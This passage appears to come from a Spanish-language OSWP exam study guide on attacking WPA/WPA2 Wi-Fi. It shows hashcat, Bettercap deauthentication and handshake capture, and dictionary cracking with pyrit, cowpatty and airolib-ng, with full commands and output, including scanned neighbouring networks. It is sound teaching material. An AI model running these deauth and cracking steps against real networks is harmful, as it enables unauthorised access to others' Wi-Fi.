14344386\n\nebe21289a38f16ee01a35c240c356e5f:2034fbb1c553:34415d46d138:hacklab:vampress1\n\nSession..........: hashcat\nStatus...........: Cracked\nHash.Type........: WPA-EAPOL-PBKDF2\nHash.Target......: hacklab (AP:20:34:fb:b1:c5:53 STA:34:41:5d:46:d1:38)\nTime.Started.....: Sun Aug 11 19:12:43 2019 (4 secs)\nTime.Estimated...: Sun Aug 11 19:12:47 2019 (0 secs)\nGuess.Base.......: File (rockyou.txt)\nGuess.Queue......: 1/1 (100.00%)\nSpeed.#1.........:    79177 H/s (7.18ms) @ Accel:128 Loops:64 Thr:64 Vec:1\nRecovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts\nProgress.........: 807901/14344386 (5.63%)\nRejected.........: 439261/807901 (54.37%)\nRestore.Point....: 728207/14344386 (5.08%)\nRestore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1\nCandidates.#1....: 22lehvez33 -&gt; rodnesha\nHardware.Mon.#1..: Temp: 63c Util: 92% Core:1670MHz Mem:3504MHz Bus:8\n</code></pre> <p>Recuerda hacer uso del par\u00e1metro -d para especificar el dispositivo a usar. Si queremos listar la contrase\u00f1a una vez crackeada (aunque tambi\u00e9n la vemos en el output listado anteriormente), podemos hacer lo siguiente:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/usr/share/wordlists]\n\u2514\u2500\u2500\u257c #hashcat --show -m 2500 hashcatCapture.hccapx \nebe21289a38f16ee01a35c240c356e5f:2034fbb1c553:34415d46d138:hacklab:vampress1\n</code></pre> <p>En este caso, para los curiosos, haciendo uso de una GeForce GTX 1050 estar\u00edamos yendo a 79.177 Hashes por segundo, lo cual hace que en cuesti\u00f3n de segundos nos podamos recorrer todo el rockyou entero.</p>"},{"location":"Seguridad/Preparaci%C3%B3n%20OSWP/#proceso-de-ataque-con-bettercap","title":"Proceso de ataque con Bettercap","text":"<p>Todo el proceso llevado a cabo hasta ahora, puede ser realizado desde Bettercap. S\u00ed que es cierto que aunque para el caso visto prefiero tirar del m\u00e9todo convencional, en ocasiones uso Bettercap para los ataques de PKMID que explicar\u00e9 m\u00e1s adelante, para redes WPA/WPA2 sin clientes.</p> <p>Lo primero de todo para llevar a cabo el procedimiento, es poner nuestra tarjeta de red en modo monitor tal y como se detall\u00f3 en los puntos anteriormente vistos. Posteriormente, desde Bettercap, podemos hacer lo siguiente:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/opt/bettercap]\n\u2514\u2500\u2500\u257c #./bettercap -iface wlan0mon\nbettercap v2.24.1 (built for linux amd64 with go1.10.4) [type 'help' for a list of commands]\n\n wlan0mon  \u00bb wifi.recon on\n[21:07:22] [sys.log] [inf] wifi using interface wlan0mon (e4:70:b8:d3:93:5c)\n[21:07:22] [sys.log] [inf] wifi started (min rssi: -200 dBm)\n[21:07:22] [sys.log] [inf] wifi channel hopper started.\n wlan0mon  \u00bb [21:07:22] [wifi.ap.new] wifi access point MOVISTAR_49BA (-92 dBm) detected as 84:aa:9c:f1:49:bc (MitraStar Technology Corp.).\n wlan0mon  \u00bb [21:07:22] [wifi.ap.new] wifi access point MOVISTAR_2F95 (-93 dBm) detected as e8:d1:1b:21:2f:96 (Askey Computer Corp).\n wlan0mon  \u00bb [21:07:22] [wifi.ap.new] wifi access point LowiF7D3 (-84 dBm) detected as 10:62:d0:f6:f7:d8 (Technicolor CH USA Inc.).\n wlan0mon  \u00bb [21:07:22] [wifi.ap.new] wifi access point MOVISTAR_A908 (-90 dBm) detected as fc:b4:e6:99:a9:09 (Askey Computer Corp).\n wlan0mon  \u00bb [21:07:22] [wifi.ap.new] wifi access point devolo-30d32d583e03 (-96 dBm) detected as 30:d3:2d:58:3e:03 (devolo AG).\n wlan0mon  \u00bb [21:07:24] [wifi.ap.new] wifi access point MOVISTAR_1677 (-54 dBm) detected as 1c:b0:44:d4:16:78 (Askey Computer Corp).\n wlan0mon  \u00bb [21:07:24] [wifi.ap.new] wifi access point MIWIFI_psGP (-94 dBm) detected as 50:78:b3:ee:bb:ac.\n wlan0mon  \u00bb [21:07:25] [wifi.ap.new] wifi access point Wlan1 (-81 dBm) detected as f8:8e:85:df:3e:13 (Comtrend Corporation).\n wlan0mon  \u00bb [21:07:27] [wifi.ap.new] wifi access point linksys (-73 dBm) detected as 00:12:17:70:d5:2c (Cisco-Linksys, LLC).\n wlan0mon  \u00bb [21:07:27] [wifi.ap.new] wifi access point devolo-30d32d583c6b (-82 dBm) detected as 30:d3:2d:58:3c:6b (devolo AG).\n wlan0mon  \u00bb [21:07:27] [wifi.client.new] new station 78:4f:43:24:01:4e (Apple, Inc.) detected for linksys (00:12:17:70:d5:2c)\n wlan0mon  \u00bb [21:07:27] [wifi.ap.new] wifi access point MOVISTAR_3126 (-93 dBm) detected as cc:d4:a1:0c:31:28 (MitraStar Technology Corp.).\n wlan0mon  \u00bb [21:07:27] [wifi.ap.new] wifi access point vodafone4038 (-92 dBm) detected as 28:9e:fc:0c:40:3e (Sagemcom Broadband SAS).\n wlan0mon  \u00bb [21:07:27] [wifi.client.new] new station f0:7b:cb:04:d7:37 (Hon Hai Precision Ind. Co.,Ltd.) detected for linksys (00:12:17:70:d5:2c)\n</code></pre> <p>Es decir, a trav\u00e9s del comando wifi.recon on, monitorizamos las redes disponibles del entorno, tal y como lo har\u00edamos desde airodump. Una vez hecho, por comodidad, filtramos los resultados por el n\u00famero de clientes/estaciones disponibles para los distintos AP's:</p> <pre><code> wlan0mon  \u00bb set wifi.show.sort clients desc\n ```\n\n Por \u00faltimo, a trav\u00e9s de la utilidad **ticker**, podemos especificar los comandos que queramos que se ejecuten\n a intervalos regulares de tiempo. En mi caso, especificar\u00e9 que quiero hacer una limpieza de pantalla seguido\n de la operaci\u00f3n **wifi.show**, que se encargar\u00e1 de listarme los puntos de acceso disponibles en el entorno en\nbase al criterio de filtrado a nivel de clientes que especifiqu\u00e9 en la operaci\u00f3n anterior:\n\n```bash\n wlan0mon  \u00bb set ticker.commands 'clear; wifi.show'\n wlan0mon  \u00bb ticker on\n</code></pre> <p>Una vez presionemos la tecla 'Enter', obtendremos unos resultados como estos:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502  RSSI   \u2502       BSSID       \u2502        SSID         \u2502    Encryption    \u2502         WPS          \u2502 Ch  \u2502 Clients \u25be \u2502  Sent  \u2502 Recvd \u2502   Seen   \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 -81 dBm \u2502 30:d3:2d:58:3c:6b \u2502 devolo-30d32d583c6b \u2502 WPA2 (CCMP, PSK) \u2502 2.0                  \u2502 11  \u2502 1         \u2502 326 B  \u2502 84 B  \u2502 21:15:40 \u2502\n\u2502 -69 dBm \u2502 1c:b0:44:d4:16:85 \u2502 MOVISTAR_PLUS_1677  \u2502 WPA2 (CCMP, PSK) \u2502 2.0                  \u2502 112 \u2502 1         \u2502 516 B  \u2502 344 B \u2502 21:15:31 \u2502\n\u2502 -74 dBm \u2502 00:12:17:70:d5:2c \u2502 linksys             \u2502 OPEN             \u2502                      \u2502 11  \u2502 1         \u2502 383 kB \u2502 31 kB \u2502 21:15:40 \u2502\n\u2502 -95 dBm \u2502 fc:b4:e6:99:a9:09 \u2502 MOVISTAR_A908       \u2502 WPA2 (CCMP, PSK) \u2502 2.0                  \u2502 1   \u2502           \u2502        \u2502       \u2502 21:15:34 \u2502\n\u2502 -87 dBm \u2502 f8:8e:85:df:3e:13 \u2502 Wlan1               \u2502 WPA (TKIP, PSK)  \u2502 1.0                  \u2502 9   \u2502           \u2502 7.1 kB \u2502       \u2502 21:15:39 \u2502\n\u2502 -95 dBm \u2502 e8:d1:1b:21:2f:96 \u2502 MOVISTAR_2F95       \u2502 WPA2 (CCMP, PSK) \u2502 2.0                  \u2502 1   \u2502           \u2502        \u2502       \u2502 21:15:18 \u2502\n\u2502 -98 dBm \u2502 d0:17:c2:30:45:7c \u2502 pepephone_ADSLR9C0  \u2502 WPA2 (CCMP, PSK) \u2502                      \u2502 3   \u2502           \u2502        \u2502       \u2502 21:15:19 \u2502\n\u2502 -95 dBm \u2502 cc:d4:a1:0c:31:28 \u2502 MOVISTAR_3126       \u2502 WPA2 (CCMP, PSK) \u2502 2.0 (not configured) \u2502 11  \u2502           \u2502        \u2502       \u2502 21:15:39 \u2502\n\u2502 -97 dBm \u2502 a0:ab:1b:45:ad:4f \u2502 MiFibra-FA4C-EXT    \u2502 WPA2 (TKIP, PSK) \u2502 2.0                  \u2502 1   \u2502           \u2502        \u2502       \u2502 21:15:01 \u2502\n\u2502 -90 dBm \u2502 84:aa:9c:f1:49:bc \u2502 MOVISTAR_49BA       \u2502 WPA2 (CCMP, PSK) \u2502 2.0                  \u2502 1   \u2502           \u2502        \u2502       \u2502 21:15:35 \u2502\n\u2502 -93 dBm \u2502 50:78:b3:ee:bb:ac \u2502 MIWIFI_psGP         \u2502 WPA2 (CCMP, PSK) \u2502 2.0                  \u2502 6   \u2502           \u2502        \u2502       \u2502 21:15:37 \u2502\n\u2502 -91 dBm \u2502 28:9e:fc:0c:40:3e \u2502 vodafone4038        \u2502 WPA2 (TKIP, PSK) \u2502 2.0                  \u2502 11  \u2502           \u2502        \u2502       \u2502 21:15:40 \u2502\n\u2502 -54 dBm \u2502 1c:b0:44:d4:16:78 \u2502 MOVISTAR_1677       \u2502 WPA2 (CCMP, PSK) \u2502 2.0                  \u2502 6   \u2502           \u2502 172 B  \u2502       \u2502 21:15:37 \u2502\n\u2502 -88 dBm \u2502 10:62:d0:f6:f7:d8 \u2502 LowiF7D3            \u2502 WPA2 (TKIP, PSK) \u2502 2.0                  \u2502 1   \u2502           \u2502 267 B  \u2502       \u2502 21:15:35 \u2502\n\u2502 -69 dBm \u2502 06:b0:44:d4:16:85 \u2502 MOVISTAR_1677       \u2502 WPA2 (CCMP, PSK) \u2502 2.0                  \u2502 112 \u2502           \u2502        \u2502       \u2502 21:15:31 \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nwlan0mon (ch. 40) / \u2191 0 B / \u2193 538 kB / 1392 pkts\n\n wlan0mon  \u00bb  \n</code></pre> <p>Ahora bien, \u00bfc\u00f3mo filtro el canal que me interesa?, sencillo... a trav\u00e9s de la siguiente operaci\u00f3n:</p> <pre><code> wlan0mon  \u00bb wifi.recon.channel 6\n</code></pre> <p>Esto har\u00e1 que ahora se nos listen las redes disponibles en el canal 6:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502  RSSI   \u2502       BSSID       \u2502     SSID      \u2502    Encryption    \u2502 WPS \u2502 Ch \u2502 Clients \u25be \u2502  Sent  \u2502 Recvd \u2502   Seen   \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 -94 dBm \u2502 50:78:b3:ee:bb:ac \u2502 MIWIFI_psGP   \u2502 WPA2 (CCMP, PSK) \u2502 2.0 \u2502 6  \u2502           \u2502        \u2502       \u2502 21:18:09 \u2502\n\u2502 -53 dBm \u2502 1c:b0:44:d4:16:78 \u2502 MOVISTAR_1677 \u2502 WPA2 (CCMP, PSK) \u2502 2.0 \u2502 6  \u2502           \u2502 3.4 kB \u2502       \u2502 21:18:10 \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nwlan0mon (ch. 6) / \u2191 0 B / \u2193 906 kB / 2889 pkts\n\n wlan0mon  \u00bb wifi.recon.channel 6\n</code></pre> <p>\u00bfQu\u00e9 es lo c\u00f3modo de este m\u00e9todo?, pues que por ejemplo yo ahora viendo que la red MOVISTAR_1677 tiene el BSSID 1c:b0:44:d4:16:78, podr\u00eda hacer un ataque de de-autenticaci\u00f3n sobre los clientes que Bettercap detecte en dicha red:</p> <pre><code> wlan0mon  \u00bb wifi.deauth 1c:b0:44:d4:16:78\n</code></pre> <p>Obteniendo los siguientes resultados:</p> <pre><code> wlan0mon  \u00bb wifi.deauth 1c:b0:44:d4:16:78\n wlan0mon  \u00bb [21:33:26] [sys.log] [inf] wifi deauthing client 20:34:fb:b1:c5:53 from AP MOVISTAR_1677 (channel:6 encryption:WPA2)\n ```\n\n Una vez el cliente se reconecte a la red:\n\n ```bash\n wlan0mon  \u00bb [21:33:13] [wifi.client.probe] station da:a1:19:8b:d9:82 (Google, Inc.) is probing for SSID MOVISTAR_DF12 (-38 dBm)\n wlan0mon  \u00bb [21:33:15] [wifi.client.probe] station 20:34:fb:b1:c5:53 is probing for SSID MOVISTAR_1677 (-40 dBm)\n wlan0mon  \u00bb [21:33:15] [wifi.client.handshake] captured 20:34:fb:b1:c5:53 -&gt; MOVISTAR_1677 (1c:b0:44:d4:16:78) RSN PMKID to /root/bettercap-wifi-handshakes.pcap\n wlan0mon  \u00bb [21:33:15] [wifi.client.handshake] captured 20:34:fb:b1:c5:53 -&gt; MOVISTAR_1677 (1c:b0:44:d4:16:78) WPA2 handshake to /root/bettercap-wifi-handshakes.pcap\n ```\n\n Se genera el Handshake y este es exportado autom\u00e1ticamente al fichero indicado desde el verbose de la\n herramienta. Si analizamos con **pyrit**, vemos que efectivamente... se ha capturado un Handshake por parte\n de dicha estaci\u00f3n:\n\n ```bash\n \u250c\u2500[root@parrot]\u2500[/opt/bettercap]\n\u2514\u2500\u2500\u257c #pyrit -r /root/bettercap-wifi-handshakes.pcap analyze\nPyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora\nhttps://github.com/JPaulMora/Pyrit\nThis code is distributed under the GNU General Public License v3+\n\nParsing file '/root/bettercap-wifi-handshakes.pcap' (1/1)...\nParsed 7 packets (7 802.11-packets), got 1 AP(s)\n\n#1: AccessPoint 1c:b0:44:d4:16:78 ('MOVISTAR_1677'):\n  #1: Station 20:34:fb:b1:c5:53, 4 handshake(s):\n    #1: HMAC_SHA1_AES, good, spread 1\n    #2: HMAC_SHA1_AES, good, spread 1\n    #3: HMAC_SHA1_AES, good, spread 2\n    #4: HMAC_SHA1_AES, good, spread 2\n</code></pre>"},{"location":"Seguridad/Preparaci%C3%B3n%20OSWP/#tecnicas-de-aumento-de-la-velocidad-de-computo","title":"T\u00e9cnicas de aumento de la velocidad de c\u00f3mputo","text":"<p>Si bien es cierto que considero que la velocidad de c\u00f3mputo de mi ordenador es bastante aceptable (7.000/10.000 contrase\u00f1as por segundo), \u00bfhay alguna forma de ir m\u00e1s r\u00e1pido a\u00fan?, \u00bfhay alguna forma de multiplicar por 1.000 la velocidad si ser necesario un ordenador de altos requisitos?, la respuesta es si.</p> <p>A la hora de iniciar el proceso de fuerza bruta con aircrack, por ejemplo, estamos llevando a cabo varios pasos:</p> <ul> <li>Filtrado de la captura para extraer el Hash (Handshake)</li> <li>Lectura de diccionario (CCMP por cada contrase\u00f1a en texto claro)</li> <li>Comparativa del Hash resultante con el Handshake capturado</li> <li>True/False (Si hay Match, es que esa es la contrase\u00f1a)</li> </ul> <p>\u00bfNo has pensado en que todos estos pasos se podr\u00edan omitir, si cont\u00e1semos con un diccionario de claves ya precomputadas?. Me explico, \u00bfy si en vez de tener un diccionario de contrase\u00f1as en texto claro, tenemos un diccionario de contrase\u00f1as ya pre-computadas con sus respectivos hashes?, fijaros que ahora ser\u00eda simplemente hacer los siguientes pasos:</p> <ul> <li>Lectura de la clave PMK del diccionario</li> <li>True/False (Match con el Handshake)</li> </ul> <p>Esta reducci\u00f3n de pasos es equivalente a la velocidad del tiempo de c\u00f3mputo, es decir, es mucho menor. Lo iremos viendo poco a poco, pero primero un poco de cultura :)</p>"},{"location":"Seguridad/Preparaci%C3%B3n%20OSWP/#concepto-de-rainbow-table","title":"Concepto de Rainbow Table","text":"<p>Hoy las contrase\u00f1as ya no se guardan sin cifrar \u2013o eso se espera. Cuando los usuarios de una plataforma fijan una clave de acceso para su cuenta, esta secuencia de caracteres no aparece en texto plano en una base de datos en alg\u00fan servidor, puesto que no ser\u00eda seguro: si encontrara la forma de entrar en ella, un hacker lo tendr\u00eda muy f\u00e1cil para acceder a todas las cuentas de un determinado usuario.</p> <p>Para el eCommerce, la banca en l\u00ednea o los servicios gubernamentales online esto tendr\u00eda consecuencias fatales. En lugar de ello, los servicios online utilizan diversos mecanismos criptogr\u00e1ficos para cifrar las contrase\u00f1as de sus usuarios de modo que en las bases de datos solo aparezca un valor hash (valor resumen) de la clave.</p> <p>Incluso conociendo la funci\u00f3n criptogr\u00e1fica que lo ha originado, desde este valor hash no es posible deducir la contrase\u00f1a, porque no es posible reconstruir el procedimiento a la inversa. Esto lleva a los ciberdelincuentes a recurrir a los ataques de fuerza bruta, en los cuales un programa inform\u00e1tico intenta \u201cadivinar\u201d la secuencia correcta de caracteres que constituye la contrase\u00f1a durante tanto tiempo como haga falta.</p> <p>Este m\u00e9todo puede combinarse con los llamados \u201cdiccionarios\u201d de contrase\u00f1as. En estos archivos, que circulan libremente en Internet, pueden encontrarse numerosas contrase\u00f1as que bien son muy populares o ya fueron interceptadas en el pasado. </p> <p>Los hackers tienden a probar primero todas las contrase\u00f1as del diccionario, lo que les permite ahorrar tiempo, aunque, en funci\u00f3n de la complejidad de las contrase\u00f1as (longitud y tipo de caracteres), este proceso puede resultar m\u00e1s largo y consumir m\u00e1s recursos de lo esperado.</p> <p>Tambi\u00e9n disponibles en la Red y tambi\u00e9n un recurso para descifrar claves secretas, las tablas rainbow van un paso m\u00e1s all\u00e1 de los diccionarios. Estos ficheros, que pueden llegar a tener un tama\u00f1o de varios cientos de gigabytes, contienen un listado de claves junto con sus valores hash, pero de forma incompleta: para reducir su tama\u00f1o y as\u00ed su necesidad de espacio en memoria, se crean cadenas de valores a partir de las cuales pueden reconstruirse f\u00e1cilmente los dem\u00e1s valores. Con estas tablas los valores hash encontrados en un banco de datos pueden ordenarse con sus claves en texto plano.</p> <p>Un ejemplo claro: https://hashkiller.co.uk/</p>"},{"location":"Seguridad/Preparaci%C3%B3n%20OSWP/#cracking-con-pyrit","title":"Cracking con Pyrit","text":"<p>Dicho esto y aunque todav\u00eda no vamos a meternos del todo con las Rainbow Tables, empecemos viendo c\u00f3mo podemos hacer uso de Pyrit para crackear contrase\u00f1as a trav\u00e9s de ataques por diccionario. Primero veremos el m\u00e9todo convencional y m\u00e1s tarde lo combinaremos con una Rainbow Table.</p> <p>Una vez capturado un Handshake, podemos hacer uso de Pyrit para crackear la contrase\u00f1a de la red inal\u00e1mbrica, de la siguiente forma:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #pyrit -e hacklab -i /usr/share/wordlists/rockyou.txt -r Captura-01.cap attack_passthrough\nPyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora\nhttps://github.com/JPaulMora/Pyrit\nThis code is distributed under the GNU General Public License v3+\n\nParsing file 'Captura-01.cap' (1/1)...\nParsed 43 packets (43 802.11-packets), got 1 AP(s)\n\nPicked AccessPoint 20:34:fb:b1:c5:53 automatically...\n</code></pre> <p>El modo attack_passthrough lo que se encarga es de atacar a un handshake capturado por medio de un ataque de fuerza bruta, usando el diccionario especificado a trav\u00e9s del par\u00e1metro '-r'.</p> <p>Una vez obtenida la contrase\u00f1a:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #pyrit -e hacklab -i /usr/share/wordlists/rockyou.txt -r Captura-01.cap attack_passthrough\nPyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora\nhttps://github.com/JPaulMora/Pyrit\nThis code is distributed under the GNU General Public License v3+\n\nParsing file 'Captura-01.cap' (1/1)...\nParsed 43 packets (43 802.11-packets), got 1 AP(s)\n\nPicked AccessPoint 20:34:fb:b1:c5:53 automatically...\nTried 40002 PMKs so far; 2466 PMKs per second. 123hello9\n\nThe password is 'hottie4u'.\n</code></pre> <p>Si nos fijamos... 2.466 PMKs por segundo, lo cual es bastante triste considerando la velocidad de aircrack, pero no nos preocupemos, a pesar de que ahora estamos decepcionados, m\u00e1s adelante nos sorprender\u00e1.</p>"},{"location":"Seguridad/Preparaci%C3%B3n%20OSWP/#cracking-con-cowpatty","title":"Cracking con Cowpatty","text":"<p>El uso de Cowpatty para emplear un ataque de fuerza bruta es el siguiente:</p> <pre><code>\u250c\u2500[\u2717]\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #cowpatty -f diccionario -r Captura-01.cap -s hacklab\ncowpatty 4.8 - WPA-PSK dictionary attack. &lt;jwright@hasborg.com&gt;\n\nCollected all necessary data to mount crack against WPA2/PSK passphrase.\nStarting dictionary attack.  Please be patient.\nkey no. 1000: skittles1\nkey no. 2000: princess15\nkey no. 3000: unfaithful\nkey no. 4000: andresteamo\nkey no. 5000: hennessy\nkey no. 6000: amigasporsiempre\nkey no. 7000: 0123654789\nkey no. 8000: trinitron\nkey no. 9000: flower22\nkey no. 10000: vincenzo\nkey no. 11000: pensacola\nkey no. 12000: boyracer\nkey no. 13000: grandmom\nkey no. 14000: battlefield\nkey no. 15000: badangel\n\nThe PSK is \"hottie4u\".\n\n15242 passphrases tested in 24.02 seconds:  634.53 passphrases/second\n</code></pre> <p>Importante destacar que siempre hay que especificar el ESSID de la red. Como vemos, obtenemos la contrase\u00f1a pero el c\u00f3mputo es incluso mucho menor... 634 contrase\u00f1as por segundo, lo mejoraremos.</p>"},{"location":"Seguridad/Preparaci%C3%B3n%20OSWP/#cracking-con-airolib","title":"Cracking con Airolib","text":"<p>Ahora, es cuando vamos a ir aumentando la velocidad de c\u00f3mputo. Airolib nos permite crear un diccionario de claves pre-computadas (PMK's), lo cual es una maravilla para el caso.</p> <p>Comenzaremos creando un fichero passwords-airolib, indicando el diccionario de contrase\u00f1as a usar:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #airolib-ng passwords-airolib --import passwd diccionario \nDatabase &lt;passwords-airolib&gt; does not already exist, creating it...\nDatabase &lt;passwords-airolib&gt; successfully created\nReading file...\nWriting...s read, 45922 invalid lines ignored.\nDone.\n</code></pre> <p>Una vez hecho, creamos un fichero que almacene el ESSID de nuestra red y lo sincronizamos con el archivo creado:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #echo \"hacklab\" &gt; essid.lst\n\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #airolib-ng passwords-airolib --import essid essid.lst \nReading file...\nWriting...\nDone.\n</code></pre> <p>A trav\u00e9s del par\u00e1metro '--stats', podemos comprobar que est\u00e1 todo correctamente definido:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #airolib-ng passwords-airolib --stats\nThere are 1 ESSIDs and 24078 passwords in the database. 0 out of 24078 possible combinations have been computed (0%).\n\nESSID   Priority    Done\nhacklab 64  0.0\n</code></pre> <p>Ya que airolib trae un par\u00e1metro para limpiar el archivo (l\u00edneas no legibles o errores), lo usamos tambi\u00e9n:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #airolib-ng passwords-airolib --clean all\nDeleting invalid ESSIDs and passwords...\nDeleting unreferenced PMKs...\nAnalysing index structure...\nVacuum-cleaning the database. This could take a while...\nChecking database integrity...\nintegrity_check\nok\n\nDone.\n</code></pre> <p>Y ya por \u00faltimo, hacemos uso del par\u00e1metro --batch para generar el diccionario final de claves precomputadas:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop/Red]\n\u2514\u2500\u2500\u257c #airolib-ng passwords-airolib --batch\nBatch processing ...\nComputed 5000 PMK in 13 seconds (384 PMK/s, 19078 in buffer)\nComputed 10000 PMK in 24 seconds (416 PMK/s, 14078 